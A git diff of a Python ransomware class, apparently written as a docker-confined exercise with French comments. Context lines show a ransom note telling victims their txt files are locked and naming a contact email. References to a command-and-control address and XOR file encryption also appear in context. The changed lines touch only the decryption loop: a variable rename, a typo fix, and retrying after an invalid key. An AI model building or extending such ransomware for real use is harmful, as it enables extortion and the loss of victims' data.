@@ -39,6 +39,9 @@ ENCRYPT_MESSAGE = """
                                                  
 Your txt files have been locked. Send an email to Jenesuispassimechant@jedoisjustemanger.com with title '{token}' to (maybe) unlock your data 😉. 
 """
+DECRYPT_MESSAGE = """
+
+"""
 class Ransomware:
     def __init__(self) -> None:
         self.check_hostname_is_docker()
@@ -82,9 +85,8 @@ class Ransomware:
         #Chargement des éléments nécessaires au déchiffrement
         secret_manager = SecretManager(CNC_ADDRESS, TOKEN_PATH)
         secret_manager.load()
-
         #Déchiffrement des fichiers
-        files = self.get_files("*.txt")
+        received_files = self.get_files("*.txt")
         while True:
             try:
                 #demande la clé de déchiffrement
@@ -92,19 +94,18 @@ class Ransomware:
                 #appel de la fonction set_key
                 secret_manager.set_key(candidate_key)
                 # Appel de la fonction xorfiles pour déchiffrer les fichiers
-                secret_manager.xorfiles(files)
+                secret_manager.xorfiles(received_files)
                 # Appel de la fonction clean
                 secret_manager.clean()
                 # Affichage du message de déchiffrement
-                print("Ok, tout s'est bien passé ! Tu est tranquille (pour le moment...)!")
+                print("Ok, tout s'est bien passé ! Tu es tranquille (pour le moment...)!")
                 # Sortie de la boucle
                 break
 
-            except ValueError:
+            except ValueError as erreur:
                 # Affichage du message d'erreur
-                print("A quoi tu joues là ?! Pas de clé valide, pas de fichier...")
-                # Sortie de la boucle
-                break
+                print("Error",{erreur},"A quoi tu joues là ?! Pas de clé valide, pas de fichier...")
+                
 
 
 if __name__ == "__main__":
